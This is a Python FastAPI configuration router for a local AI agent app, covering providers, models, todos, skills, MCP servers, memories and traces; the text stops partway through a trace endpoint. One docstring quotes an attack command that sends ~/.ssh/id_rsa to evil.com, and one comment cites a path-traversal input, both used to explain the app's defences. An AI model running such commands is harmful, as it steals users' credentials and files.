"""
配置类路由：供应商、模型、绑定、Todo、元信息。
"""

import base64
from pathlib import Path
from typing import Any

import structlog
from app.api import deps
from app.api.schemas import (
    BindingListResponse,
    BindingOut,
    CreateProviderRequest,
    MetaResponse,
    ModelListResponse,
    ModelOut,
    PatchTodoRequest,
    ProbedModelOut,
    ProbeRequest,
    ProbeResponse,
    ProviderListResponse,
    ProviderOut,
    SetBindingRequest,
    TodoListResponse,
    TodoOut,
)
from app.core.config import settings
from app.core.exceptions import BadRequestError, ConflictError, NotFoundError
from app.core.time import now_ms
from app.infra.db.session import get_db
from app.infra.llm.openai_compat import get_llm
from app.infra.sandbox.factory import fallback_reason as sandbox_fallback_reason
from app.infra.sandbox.factory import get_sandbox
from app.modules.agent.tools.base import ToolRegistry
from app.modules.agent.tools.todo import _serialize, _stats, load_active
from app.modules.memory import service as memory_service
from app.modules.provider import service as ps
from app.modules.provider.models import Provider
from app.modules.session import repo
from app.modules.session.models import Session
from app.modules.skill import macros as macro_registry
from app.modules.skill import package as skill_package
from app.modules.skill import registry as skill_registry
from app.modules.todo.models import Todo
from app.modules.trace import service as trace_service
from app.modules.trace import writer as trace_writer
from fastapi import APIRouter, Depends, File, Query, Request, UploadFile
from pydantic import BaseModel, Field
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

log = structlog.get_logger(__name__)
router = APIRouter()


# ─────────────────────────── provider ───────────────────────────


@router.post("/providers/probe", response_model=ProbeResponse, summary="探测模型列表")
async def probe(body: ProbeRequest) -> ProbeResponse:
    """
    用户点名的核心功能：填 base_url + key，自动拉出可用模型列表。

    纯查询，不落库。失败返回 502 + 具体 hint（不把错误塞进模型列表里 ——
    那样做会让前端把 "Error occurred: ..." 渲染成一个可选模型）。
    """
    normalized, models = await ps.probe_models(get_llm(), body.base_url, body.api_key)
    return ProbeResponse(
        normalized_base_url=normalized,
        models=[
            ProbedModelOut(
                model_id=m.model_id,
                context_window=m.context_window,
                window_source=m.window_source,
                looks_non_chat=m.looks_non_chat,
            )
            for m in models
        ],
    )


@router.get("/providers", response_model=ProviderListResponse, summary="供应商列表")
async def list_providers(db: AsyncSession = Depends(get_db)) -> ProviderListResponse:
    rows = await ps.list_providers(db)
    return ProviderListResponse(
        items=[
            ProviderOut(
                id=p.id,
                name=p.name,
                base_url=p.base_url,
                key_hint=p.key_hint,
                enabled=bool(p.enabled),
                model_count=cnt,
                last_probe_at=p.last_probe_at,
                created_at=p.created_at,
            )
            for p, cnt in rows
        ]
    )


@router.post("/providers", response_model=ProviderOut, status_code=201, summary="添加供应商")
async def create_provider(
    body: CreateProviderRequest, db: AsyncSession = Depends(get_db)
) -> ProviderOut:
    p = await ps.create_provider(
        db,
        name=body.name,
        base_url=body.base_url,
        api_key=body.api_key,
        models=[m.model_dump() for m in body.models],
    )
    models = await ps.list_models(db, p.id)

    # 首次添加时自动绑定 chat 位 —— 否则用户加完供应商回到对话页
    # 仍然报"未配置模型"，而他并不知道还差一步。
    if models and not await ps.has_chat_model(db):
        first_chat = next((m for m in models if m.enabled), models[0])
        await ps.set_binding(db, purpose="chat", model_pk=first_chat.id)
        log.info("auto_bound_chat", model=first_chat.model_id)

    return ProviderOut(
        id=p.id,
        name=p.name,
        base_url=p.base_url,
        key_hint=p.key_hint,
        enabled=bool(p.enabled),
        model_count=len(models),
        last_probe_at=p.last_probe_at,
        created_at=p.created_at,
    )


@router.delete("/providers/{provider_id}", summary="删除供应商")
async def delete_provider(provider_id: str, db: AsyncSession = Depends(get_db)) -> dict[str, bool]:
    await ps.delete_provider(db, provider_id)
    return {"ok": True}


@router.get("/models", response_model=ModelListResponse, summary="模型列表")
async def list_models(
    provider_id: str | None = Query(None),
    enabled_only: bool = Query(
        False, description="只返回已启用的。对话页的切换菜单用这个"
    ),
    db: AsyncSession = Depends(get_db),
) -> ModelListResponse:
    """
    模型列表。

    带 enabled_only 时只返回启用的 —— 对话页的快捷切换菜单用它。
    设置页要看到全部（包括禁用的），否则用户没法把它重新启用。
    """
    rows = await ps.list_models(db, provider_id)
    if enabled_only:
        rows = [m for m in rows if m.enabled]

    # 一次查出所有供应商名，避免每个模型查一次
    pmap = {
        p.id: p.name for p in (await db.execute(select(Provider))).scalars()
    }
    return ModelListResponse(
        items=[
            ModelOut(
                id=m.id,
                provider_id=m.provider_id,
                provider_name=pmap.get(m.provider_id, ""),
                model_id=m.model_id,
                display_name=m.display_name,
                context_window=m.context_window,
                window_source=m.window_source,
                supports_vision=m.supports_vision,
                supports_tools=m.supports_tools,
                enabled=bool(m.enabled),
                price_in_per_1m=m.price_in_per_1m,
                price_out_per_1m=m.price_out_per_1m,
            )
            for m in rows
        ]
    )


@router.post("/models/{model_pk}/verify-vision", summary="核验图片输入能力")
async def verify_vision(
    model_pk: str, db: AsyncSession = Depends(get_db)
) -> dict[str, object]:
    """
    发一次真实的多模态请求，确认这个模型收不收图片。

    ## 为什么必须真的发请求

    模型列表接口不返回"支不支持图片"。名字也不可靠 —— `gpt-4o-mini` 支持、
    `deepseek-chat` 不支持，两个名字里都没有 vision 字样。中转站更乱，
    同一个名字背后可能换过模型。

    所以只能试。用 1x1 的图，把成本压到最低。
    """
    m = await ps.verify_vision(db, get_llm(), model_pk)
    return {
        "model_pk": m.id,
        "model_id": m.model_id,
        "supports_vision": m.supports_vision,
        "checked_at": m.vision_checked_at,
        # 上游原话。失败原因有好几种（真不支持 / 中转站不转发 / key 无权限 /
        # 模型名错），修复动作完全不同，所以要把原话给用户看
        "detail": getattr(m, "_vision_detail", ""),
    }


@router.get("/bindings", response_model=BindingListResponse, summary="功能位绑定")
async def list_bindings(db: AsyncSession = Depends(get_db)) -> BindingListResponse:
    rows = await ps.list_bindings(db)
    return BindingListResponse(
        items=[
            BindingOut(
                id=b.id,
                agent_name=b.agent_name,
                purpose=b.purpose,
                model_pk=b.model_pk,
                model_id=m.model_id,
                provider_name=p.name,
            )
            for b, m, p in rows
        ]
    )


@router.put("/bindings", summary="设置功能位（upsert）")
async def set_binding(
    body: SetBindingRequest, db: AsyncSession = Depends(get_db)
) -> dict[str, str]:
    b = await ps.set_binding(
        db, purpose=body.purpose, model_pk=body.model_pk, agent_name=body.agent_name
    )
    return {"id": b.id}


# ─────────────────────────── todo ───────────────────────────


@router.get(
    "/sessions/{session_id}/todos", response_model=TodoListResponse, summary="任务清单"
)
async def list_todos(session_id: str, db: AsyncSession = Depends(get_db)) -> TodoListResponse:
    await repo.get_session(db, session_id)
    rows = await load_active(db, session_id)
    return TodoListResponse(
        items=[TodoOut(**t) for t in _serialize(rows)], stats=_stats(rows)
    )


@router.patch("/todos/{todo_id}", response_model=TodoOut, summary="修改任务")
async def patch_todo(
    todo_id: str, body: PatchTodoRequest, db: AsyncSession = Depends(get_db)
) -> TodoOut:
    t = (await db.execute(select(Todo).where(Todo.id == todo_id))).scalar_one_or_none()
    if t is None:
        raise NotFoundError("任务不存在", code="todo_not_found")

    data = body.model_dump(exclude_unset=True)
    if data.get("status") == "in_progress":
        # 保证唯一：把该会话其它 in_progress 降为 pending
        others = await load_active(db, t.session_id)
        for o in others:
            if o.id != t.id and o.status == "in_progress":
                o.status = "pending"
    for k, v in data.items():
        if v is not None:
            setattr(t, k, v)
    await db.commit()
    return TodoOut(**_serialize([t])[0])


@router.delete("/todos/{todo_id}", summary="删除任务")
async def delete_todo(todo_id: str, db: AsyncSession = Depends(get_db)) -> dict[str, bool]:
    t = (await db.execute(select(Todo).where(Todo.id == todo_id))).scalar_one_or_none()
    if t is None:
        raise NotFoundError("任务不存在", code="todo_not_found")
    await db.delete(t)
    await db.commit()
    return {"ok": True}


@router.post("/sessions/{session_id}/todos/archive", summary="验收关闭")
async def archive_todos(session_id: str, db: AsyncSession = Depends(get_db)) -> dict[str, int]:
    rows = await load_active(db, session_id)
    ts = now_ms()
    for t in rows:
        t.archived_at = ts
    await db.commit()
    return {"archived_count": len(rows)}


# ─────────────────────────── meta ───────────────────────────


@router.get("/meta", response_model=MetaResponse, summary="运行时元信息")
async def meta(
    db: AsyncSession = Depends(get_db), registry: ToolRegistry = Depends(deps.get_registry)
) -> MetaResponse:
    """前端启动时拉一次，用于判断哪些功能可用。"""
    # 探真实可用性，而不是"docker 这个 python 包能不能 import"。
    #
    # 原来的实现是 `import docker` 成功就算可用 —— 那只说明装了 SDK，
    # 完全不代表 Docker 守护进程在跑、镜像在本地。而本项目的实现走
    # docker CLI，根本不用那个 SDK，所以旧检查连"装没装"都测不对。
    #
    # 用 get_sandbox() 而不是直接 DockerSandbox().health：
    # 它的结果有缓存，且降级原因也从同一处拿 —— 两处各自探测的话，
    # meta 说可用而实际执行走的是本地，前端就不会显示警告。
    sandbox = await get_sandbox()
    docker_ok = sandbox.name == "docker"

    return MetaResponse(
        version="0.1.0",
        sandbox_backend=settings.sandbox.backend,
        sandbox_docker_available=docker_ok,
        sandbox_fallback_reason=sandbox_fallback_reason(),
        sandbox_isolated=sandbox.isolated,
        websearch_backend=settings.websearch.backend,
        has_chat_model=await ps.has_chat_model(db),
        host_is_localhost=settings.is_localhost,
        # 与系统提示词读【同一个 index 对象】。
        #
        # /skills 端点实时扫描而系统提示词走 lru_cache，
        # 两者会长期不一致 —— 前端列出来的技能和模型实际看到的可能不是
        # 同一批，而这种不一致没有任何提示。
        skill_count=len(skill_registry.get_index().skills),
        macro_count=len(macro_registry.get_index().macros),
        mcp_tool_count=0,
        tool_names=registry.names(),
    )


@router.get("/skills", summary="技能列表")
async def list_skills() -> dict[str, object]:
    """
    列出已安装技能。

    诊断一并返回 —— 用户需要知道"我上传的技能为什么没出现"。
    诊断只写进日志的话，用户在界面上看不到，
    只能看到技能凭空消失。
    """
    idx = skill_registry.get_index()
    return {
        "items": [
            {
                "name": m.name,
                "description": m.description,
                "version": m.version,
                "keywords": m.keywords,
                "files": m.files,
            }
            for m in sorted(idx.skills.values(), key=lambda s: s.name)
        ],
        "diagnostics": [
            {"level": d.level, "message": d.message, "path": d.path}
            for d in idx.diagnostics
        ],
    }


@router.post("/skills/reload", summary="重扫技能目录")
async def reload_skills() -> dict[str, object]:
    """
    手动重扫。改了 SKILL.md 或手动放了技能目录后调用，不需要重启。

    lru_cache 让这件事不可能 —— 改任何技能都必须重启进程。
    """
    idx = skill_registry.reload()
    return {"count": len(idx.skills), "names": idx.names()}


class WebSearchPatch(BaseModel):
    """联网搜索的运行时开关。"""

    # none | ddg | tavily
    backend: str = Field(..., pattern="^(none|ddg|tavily)$")
    tavily_api_key: str | None = None


@router.get("/websearch", summary="联网搜索状态")
async def websearch_get(request: Request) -> dict[str, object]:
    reg: ToolRegistry = request.app.state.registry
    return {
        "backend": settings.websearch.backend or "none",
        "has_tavily_key": bool(settings.websearch.tavily_api_key),
        "registered": "web_search" in reg.names(),
        # 依赖装了没 —— 没装的话选了 ddg 也起不来，
        # 而错误只会在模型调用时才出现
        "ddg_available": _mod_ok("ddgs"),
        "tavily_available": _mod_ok("tavily"),
    }


def _mod_ok(name: str) -> bool:
    import importlib.util

    return importlib.util.find_spec(name) is not None


@router.put("/websearch", summary="开关联网搜索")
async def websearch_put(
    body: WebSearchPatch, request: Request
) -> dict[str, object]:
    """
    运行时开关联网搜索，不用改 .env 重启。

    ## 为什么联网搜索默认是关的

    它会把用户的查询词发给第三方搜索引擎。这种有外部副作用的能力
    必须显式同意，不能因为装了个包就默认开。

    ## 为什么需要这个接口

    但"必须改 .env 再重启"对普通使用者门槛太高 —— 他 clone 下来
    想开个联网搜索，要去翻文档找环境变量名、改文件、重启进程。

    这里改的是【运行时的 settings 对象】，进程重启后回落 .env 的值。
    想持久化就写 .env（响应里给出具体该写什么）。

    改完立刻重建 web 工具，所以不需要重启。
    """
    from app.modules.web import tools as web_tools

    if body.backend == "tavily":
        key = body.tavily_api_key or settings.websearch.tavily_api_key
        if not key:
            raise BadRequestError(
                "Tavily 需要 API Key。去 tavily.com 注册一个免费的，"
                "或者改用 ddg（免费、不需要 key）",
                code="tavily_key_required",
            )
        settings.websearch.tavily_api_key = key
    if body.backend != "none" and not _mod_ok(
        "tavily" if body.backend == "tavily" else "ddgs"
    ):
        raise BadRequestError(
            f"缺少 {body.backend} 需要的依赖。装：uv sync --extra search",
            code="search_dep_missing",
        )

    settings.websearch.backend = body.backend

    # 重建 web 工具。
    #
    # 【必须先摘掉旧的】—— 只 register 不 unregister 的话，
    # 从 ddg 切到 tavily 后 registry 里还是旧 provider 的实例，
    # 而用户以为已经切了。
    reg: ToolRegistry = request.app.state.registry
    for name in ("web_search", "web_fetch"):
        reg.unregister(name)
    for t in web_tools.build_web_tools():
        reg.register(t)

    env_hint = (
        f"JEEVES_WEBSEARCH__BACKEND={body.backend}"
        if body.backend != "none"
        else "JEEVES_WEBSEARCH__BACKEND=none"
    )
    log.info("websearch_switched", backend=body.backend)
    return {
        "backend": body.backend,
        "registered": "web_search" in reg.names(),
        "tools": [n for n in reg.names() if n.startswith("web_")],
        # 说清楚这是临时的 —— 不说的话用户重启后发现又关了，
        # 会以为是 bug
        "persisted": False,
        "persist_hint": f"要重启后仍生效，把 {env_hint} 写进 .env",
    }


@router.get("/mcp/servers", summary="MCP 服务器状态")
async def mcp_servers() -> dict[str, object]:
    """
    列出所有 MCP 服务器及其工具。

    ## 为什么要暴露 estimated_tokens

    MCP 工具定义是**常驻上下文成本** —— 每轮请求都要带全部工具的名字、
    描述、入参 schema。配 5 个服务器共 60 个工具可能就是上万 token，
    每轮都烧。

    看不到这个数字的话，用户会觉得"多开几个 MCP 没坏处"。
    """
    from app.modules.mcp.loader import estimate_tokens, load_configs
    from app.modules.mcp.manager import get_manager

    _configs, errors = load_configs()
    items = []
    for st in get_manager().states():
        d = st.to_dict()
        d["estimated_tokens"] = estimate_tokens(st.tools)
        items.append(d)
    return {"items": items, "config_errors": errors}


@router.get("/mcp/pending-approval", summary="待确认的 stdio 启动命令")
async def mcp_pending() -> dict[str, object]:
    """
    列出配置里未确认过启动命令的 stdio 服务器。

    ## 为什么需要这个接口

    规范的 Local MCP Server Compromise 一节要求：一键配置本地 MCP 服务器
    时**必须**先让用户看到完整命令并确认。它给的攻击例子是：

        npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com

    本地 MCP 服务器等于任意代码执行，且以应用相同的权限运行。

    返回的 `command` 字段是**完整未截断**的 —— 规范明写
    `without truncation`，因为省略的中间部分正是藏 payload 的地方。
    """
    from app.modules.mcp.config import full_command, scan_command
    from app.modules.mcp.loader import load_configs

    configs, _errors = load_configs()
    items = []
    for c in configs:
        if c.transport != "stdio" or c.command_approved or not c.enabled:
            continue
        items.append(
            {
                "server_id": c.server_id,
                # 完整命令，不截断
                "command": full_command(c.command, c.args),
                "cwd": c.cwd,
                # 有哪些环境变量（只给键名，值可能是 token）
                "env_keys": sorted(c.env),
                "warnings": scan_command(c.command, c.args),
            }
        )
    return {"items": items}


@router.post("/mcp/reload", summary="重载 MCP 配置")
async def mcp_reload(request: Request) -> dict[str, object]:
    """
    重读配置并重连所有服务器。

    ## 为什么不自动重启崩掉的服务器

    反复崩溃的服务器会造成无限重启循环，日志被刷满而且每次都拉起一个
    子进程。手动 reload 更可控。
    """
    from app.modules.mcp.loader import load_configs
    from app.modules.mcp.manager import get_manager
    from app.modules.mcp.tools import build_tools

    mgr = get_manager()
    await mgr.disconnect_all()

    configs, errors = load_configs()
    await mgr.connect_all(configs)

    # 重新注册工具。先摘掉旧的 mcp__ 工具再加新的 ——
    # 不摘的话上一次的工具会残留，而它们指向已关闭的连接。
    reg: ToolRegistry = request.app.state.registry
    for old_name in [n for n in reg.names() if n.startswith("mcp__")]:
        reg.unregister(old_name)
    added = 0
    for tool in build_tools():
        reg.register(tool)
        added += 1

    return {
        "servers": len(configs),
        "ready": sum(1 for s in mgr.states() if s.status == "ready"),
        "tools": added,
        "config_errors": errors,
    }


@router.get("/ref-candidates", summary="引用候选（@ 提词器用）")
async def ref_candidates(
    q: str = Query("", description="模糊查询"),
    kind: str = Query("file", description="file | skill | tool | macro"),
    session_id: str | None = Query(None, description="文件搜索的范围来自该会话的工作目录"),
    limit: int = Query(20, ge=1, le=50),
    db: AsyncSession = Depends(get_db),
    registry: ToolRegistry = Depends(deps.get_registry),
) -> dict[str, object]:
    """
    提词器候选。

    ## 为什么文件候选必须在后端搜

    技能/工具/宏是几十个量级，前端拉全量本地过滤就够。但文件可能上万个 ——
    全量传给前端不现实，必须后端搜。

    ## 必须排除忽略目录

    成熟实现会尊重 .gitignore。
    不排除的话候选列表会被 `node_modules` / `.venv` 淹掉，功能等于废掉 ——
    用户搜 "main" 会先看到几十个 `node_modules/.../main.js`。
    """
    query = q.strip().lower()

    if kind == "skill":
        idx = skill_registry.get_index()
        items = [
            {"name": n, "detail": _one_line_desc(d)}
            for n, d in idx.l1()
            if not query or query in n.lower() or query in d.lower()
        ]
        return {"items": items[:limit]}

    if kind == "macro":
        midx = macro_registry.get_index()
        items = [
            {"name": n, "detail": ""}
            for n in midx.names()
            if not query or query in n.lower()
        ]
        return {"items": items[:limit]}

    if kind == "tool":
        # 工具清单从注册表拿。这里只给名字和一行描述 ——
        # 完整描述有几百字，候选列表放不下也不需要
        items = [
            {"name": n, "detail": _one_line_desc(getattr(registry.get(n), "description", ""))}
            for n in registry.names()
            if not query or query in n.lower()
        ]
        return {"items": items[:limit]}

    # 文件搜索。
    #
    # ## 为什么必须按会话取目录
    #
    # 原来这里是 `select(Workspace).limit(1)` —— 取【任意一个】工作区，
    # 而那恒等于项目自己的 workspace/ 目录（里面基本是空的）。
    # 结果是 @ 补全永远显示"没有匹配的文件"，而用户的代码明明就在
    # 他指定的目录里。
    #
    # 现在按 session_id 取该会话的工作目录。没给 session_id 或
    # 会话还没设工作目录时，返回空列表并带上原因 ——
    # 让前端能显示"先设置工作目录"而不是含糊的"没有匹配"。
    roots: list[Path] = []
    if session_id:
        s = (
            await db.execute(select(Session).where(Session.id == session_id))
        ).scalars().first()
        if s is not None and s.work_dir:
            wd = Path(s.work_dir)
            if wd.is_dir():
                roots.append(wd)

    if not roots:
        return {
            "items": [],
            # 前端据此区分"目录里真的没有匹配"和"还没设工作目录"
            "reason": "no_work_dir",
            "hint": "这个对话还没设置工作目录，点输入框上方的目录名来指定",
        }

    return {"items": _search_files(roots[0], query, limit)}


def _one_line_desc(text: object) -> str:
    s = " ".join(str(text or "").split())
    return s[:80]


# 搜索时跳过的目录。
#
# 不跳的话候选列表会被依赖目录淹掉 —— 用户搜 "main" 先看到几十个
# node_modules 里的 main.js，真正要的文件排在后面。
_SKIP_DIRS = frozenset(
    {
        ".git", ".venv", "venv", "node_modules", "__pycache__", ".mypy_cache",
        ".pytest_cache", ".ruff_cache", "dist", "build", ".next", ".turbo",
        ".idea", ".vscode", "target", ".gradle", "coverage", ".tox",
    }
)

# 遍历上限。
#
# 没有上限的话在一个巨大的目录树上搜索会让接口挂几秒 ——
# 而这是交互式操作，用户每打一个字符就触发一次。
_MAX_SCAN = 8000


def _search_files(root: Path, query: str, limit: int) -> list[dict[str, object]]:
    """
    模糊搜文件。

    ## 打分按"文件名"优先于"路径"

    搜 `main` 时 `src/main.py` 必须排在 `src/domain/other.py`（路径里含 main
    的目录）前面。常见的分档是：
    文件名完全匹配 100 / 前缀 80 / 包含 50 / 路径包含 30。
    """
    scored: list[tuple[int, str, dict[str, object]]] = []
    scanned = 0

    def walk(d: Path, depth: int) -> None:
        nonlocal scanned
        if scanned >= _MAX_SCAN or depth > 8:
            return
        try:
            entries = sorted(d.iterdir(), key=lambda p: (p.is_file(), p.name))
        except OSError:
            return
        for p in entries:
            if scanned >= _MAX_SCAN:
                return
            if p.name.startswith(".") and p.name not in {".env.example"}:
                continue
            if p.is_dir():
                if p.name in _SKIP_DIRS:
                    continue
                walk(p, depth + 1)
                continue
            scanned += 1
            rel = p.relative_to(root).as_posix()
            name_l = p.name.lower()
            rel_l = rel.lower()
            if not query:
                score = 10
            elif name_l == query:
                score = 100
            elif name_l.startswith(query):
                score = 80
            elif query in name_l:
                score = 50
            elif query in rel_l:
                score = 30
            else:
                continue
            scored.append(
                (score, rel, {"name": p.name, "path": rel, "detail": rel, "is_dir": False})
            )

    if root.is_dir():
        walk(root, 0)
    # 分数降序，同分按路径短的优先（浅层文件通常更相关）
    scored.sort(key=lambda x: (-x[0], len(x[1]), x[1]))
    return [item for _s, _r, item in scored[:limit]]


@router.post("/images/upload", status_code=201, summary="上传图片")
async def upload_image(file: UploadFile = File(...)) -> dict[str, object]:
    """
    上传一张图片，返回它的 data URL。

    ## 为什么返回 data URL 而不是文件路径

    图片最终要以 base64 塞进 LLM 请求（供应商拉不到我们的 localhost 地址）。
    存文件再读回来编码等于多绕一圈，而且要处理清理问题。

    直接返回 data URL，前端拿着它渲染预览、发消息时原样带上。

    ## 校验在服务端做

    只信前端校验等于没校验。这里查魔数 —— MIME 是前端声明的，
    把 .exe 说成 image/png 上传，内容就会被 base64 发给供应商。
    """
    from app.modules.provider import vision

    raw = await file.read()
    mime = (file.content_type or "").lower()
    ok, err = vision.validate_image(raw, mime)
    if not ok:
        raise BadRequestError(err, code="image_invalid")

    b64 = base64.b64encode(raw).decode()
    log.info("image_uploaded", mime=mime, bytes=len(raw))
    return {
        "data_url": f"data:{mime};base64,{b64}",
        "mime": mime,
        "bytes": len(raw),
        "filename": file.filename or "image",
    }


@router.post("/skills/upload", status_code=201, summary="上传技能包（zip）")
async def upload_skill(
    file: UploadFile = File(...),
    overwrite: bool = Query(False, description="同名技能已存在时是否覆盖"),
) -> dict[str, object]:
    """
    上传并安装一个技能包。

    校验在入口做 fail-fast，不静默接受半个包 —— 后续所有环节都能假定
    技能目录里的内容是合法的。
    """
    if not (file.filename or "").lower().endswith(".zip"):
        raise BadRequestError("只接受 zip 文件", code="skill_not_zip")

    data = await file.read()
    if not data:
        raise BadRequestError("文件为空", code="skill_empty")

    try:
        result = skill_package.install_package(
            data, settings.skills_dir, overwrite=overwrite
        )
    except skill_package.SkillPackageError as e:
        msg = str(e)
        if "已存在" in msg:
            # 409 而不是 400：这不是包的问题，用户加 overwrite=true 就能继续
            raise ConflictError(msg, code="skill_exists") from e
        raise BadRequestError(msg, code="skill_invalid") from e

    # 装完立刻重扫，新技能当轮对话就能用
    idx = skill_registry.reload()
    return {
        "name": result.name,
        "files": result.files,
        "skipped": result.skipped,
        "skill_count": len(idx.skills),
    }


@router.delete("/skills/{name}", summary="删除技能")
async def delete_skill(name: str) -> dict[str, object]:
    idx = skill_registry.get_index()
    meta = idx.get(name)
    if meta is None:
        raise NotFoundError("技能不存在", code="skill_not_found")

    # 用索引里记录的目录，不用 name 拼路径 —— name 来自 URL 路径参数，
    # 拼路径就等于把 rmtree 的目标交给了请求方。
    # 提示词加载上同样容易踩这个坑：key 来自 HTTP 路径参数直接拼路径，
    # 传 ../../../../Windows/win 能读到目录外任意文件。
    target = meta.dir.resolve()
    root = settings.skills_dir.resolve()
    try:
        target.relative_to(root)
    except ValueError as e:
        raise BadRequestError("技能目录不在 skills/ 下，拒绝删除") from e

    import shutil

    shutil.rmtree(target, ignore_errors=True)
    new_idx = skill_registry.reload()
    return {"deleted": name, "skill_count": len(new_idx.skills)}


@router.get("/macros", summary="宏列表（前端提词器用）")
async def list_macros() -> dict[str, object]:
    """
    列出所有宏。

    宏【不进系统提示词】—— 它是用户按 `!` 主动触发的，模型不需要知道
    它存在。所以这个端点是给前端提词器用的，不是给模型用的。

    虽然在文档里区分了 Skill 和 Macro，但运行时两者毫无差异
    （宏照样占常驻上下文位）。这里让这个区分真的成立。
    """
    idx = macro_registry.get_index()
    return {
        "items": [
            {
                "name": m.name,
                "description": m.description,
                "keywords": m.keywords,
            }
            for m in sorted(idx.macros.values(), key=lambda x: x.name)
        ],
        "diagnostics": [
            {"level": d.level, "message": d.message, "path": d.path}
            for d in idx.diagnostics
        ],
    }


@router.get("/macros/{name}", summary="取宏正文")
async def get_macro(name: str) -> dict[str, str]:
    """
    取正文。前端在用户选中宏后调用，把正文以 user 角色注入本轮消息前部。

    走 user 角色而不是 system：宏是用户自己写的流程，它代表用户的意图，
    放 user 位语义正确。技能不同 —— 技能可能来自第三方，所以走 role=tool。
    """
    meta = macro_registry.get_index().get(name)
    if meta is None:
        raise NotFoundError("宏不存在", code="macro_not_found")
    return {"name": meta.name, "body": macro_registry.read_macro_body(meta)}


@router.post("/macros/reload", summary="重扫宏目录")
async def reload_macros() -> dict[str, object]:
    idx = macro_registry.reload()
    return {"count": len(idx.macros), "names": idx.names()}


def _memory_out(m: Any) -> dict[str, object]:
    return {
        "id": m.id,
        "content": m.content,
        "theme": m.theme,
        "hit": m.hit,
        "confidence": m.confidence,
        "source": m.source,
        "origin_session_id": m.origin_session_id,
        "archived": m.archived_at is not None,
        "updated_at": m.updated_at,
        # 变更历史。用户看到一条错误记忆时，首先要能查"它怎么变成这样的"。
        # 这一步容易被漏掉。
        "history": memory_service.parse_history(m),
    }


@router.get("/memories", summary="记忆列表")
async def list_memories(
    include_archived: bool = Query(False),
    theme: str | None = Query(None),
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    rows = await memory_service.list_all(
        db, include_archived=include_archived, theme=theme
    )
    return {
        "items": [_memory_out(m) for m in rows],
        "themes": [{"theme": t, "count": c} for t, c in await memory_service.themes(db)],
    }


@router.post("/memories", summary="手动添加记忆", status_code=201)
async def create_memory(
    body: dict[str, str],
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    """
    用户手写的记忆。

    confidence 直接给 1.0 —— 用户自己写的不需要打折。
    模型自动提炼的是 0.6，主动调工具记的是 0.8。
    """
    m = await memory_service.create(
        db,
        content=body.get("content", ""),
        theme=body.get("theme", "其他"),
        source="manual",
        confidence=1.0,
    )
    await db.commit()
    return _memory_out(m)


@router.patch("/memories/{memory_id}", summary="修改记忆")
async def update_memory(
    memory_id: str,
    body: dict[str, str],
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    m = await memory_service.update(
        db,
        memory_id,
        # 用户在界面上改的，reason 可以自动填 —— 但仍然要写进 history，
        # 因为"是用户改的还是模型改的"本身就是重要信息
        reason=body.get("reason") or "用户在界面上修改",
        content=body.get("content"),
        theme=body.get("theme"),
        # 用户改过的记忆置信度拉满
        confidence=1.0,
    )
    await db.commit()
    return _memory_out(m)


@router.delete("/memories/{memory_id}", summary="归档记忆")
async def archive_memory(
    memory_id: str,
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    """
    归档而非真删。

    真删的问题：模型下一轮可能重新提炼出同一条，用户得反复删。
    归档保留了"这条被否决过"的信息，而且用户能恢复。
    """
    m = await memory_service.archive(db, memory_id, reason="用户删除")
    await db.commit()
    return _memory_out(m)


@router.post("/memories/{memory_id}/restore", summary="恢复归档的记忆")
async def restore_memory(
    memory_id: str,
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    m = await memory_service.restore(db, memory_id)
    await db.commit()
    return _memory_out(m)


@router.get("/memories-search", summary="按关键词召回（调试用）")
async def search_memories(
    q: str = Query(..., min_length=1),
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    """
    暴露召回结果和打分，用来验证"为什么这条被召回了/为什么没被召回"。

    没有这个接口的话，召回质量只能靠猜。
    """
    hits = await memory_service.recall(db, q)
    return {
        "items": [
            {**_memory_out(h.memory), "score": h.score} for h in hits
        ],
        "injection_preview": memory_service.format_for_injection(hits),
    }


@router.get("/traces-sessions", summary="按会话汇总的执行记录")
async def trace_sessions(
    limit: int = Query(50, ge=1, le=200),
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    """
    追踪的第一层：有哪些会话产生过执行记录。

    ## 为什么要这一层

    原来直接铺开所有 run，几十条 run_id 的后 8 位混在一起，
    没有任何线索说明哪条属于哪个对话 —— 用户想找"刚才那次出错的"
    只能一条条点开看。

    先按会话分组、带上标题和汇总，点进去再看细节。

    ## 为什么不复用 /traces 再让前端分组

    前端分组拿不到会话标题（run 表里只有 session_id），
    而且 /traces 有 limit —— 前端拿到的可能只是一部分会话的一部分 run，
    汇总数字会是错的。
    """
    rows = await trace_service.list_session_summaries(db, limit=limit)
    return {
        "items": [
            {
                "session_id": r["session_id"],
                # 会话可能已被删（run 有 CASCADE，但汇总是查历史）
                "title": r["title"] or "未命名会话",
                "runs": r["runs"],
                "total_tokens": r["total_tokens"],
                "cost_usd": r["cost_usd"],
                "errors": r["errors"],
                "last_at": r["last_at"],
            }
            for r in rows
        ]
    }


@router.get("/traces", summary="执行记录列表")
async def list_traces(
    session_id: str | None = Query(None),
    limit: int = Query(50, ge=1, le=200),
    db: AsyncSession = Depends(get_db),
) -> dict[str, object]:
    runs = await trace_service.list_runs(db, session_id=session_id, limit=limit)
    return {
        "items": [
            {
                "run_id": r.id,
                "session_id": r.session_id,
                "parent_run_id": r.parent_run_id,
                "agent_name": r.agent_name,
                "status": r.status,
                "stop_reason": r.stop_reason,
                "started_at": r.started_at,
                "duration_ms": r.duration_ms,
                "turns": r.turns,
                "total_tokens": r.total_tokens,
                # 含子代理的累计。不聚合的话这个数答不出来 ——
                # 它们要么在前端内存累加，要么在展示层重建，要么没实现。
                "rollup_total_tokens": r.rollup_total_tokens,
                "cost_usd": r.cost_usd,
                "rollup_cost_usd": r.rollup_cost_usd,
                "error": r.error,
            }
            for r in runs
        ]
    }


@router.get("/traces/{run_id}", summary="执行树")
async def get_trace(
    run_id: str, db: AsyncSession = Depends(get_db)
) -> dict[str, object]:
    run = await trace_service.get_run(db, run_id)
    if run is None:
        raise NotFoundError("执行记录不存在", code="run_not_found")
    tree = await trace_service.get_span_tree(db, run_id)
    # 从 span 汇总真实用量。
    #
    # run.total_tokens 只有主 loop 的量 —— 子代理与父代理共享 run_id，
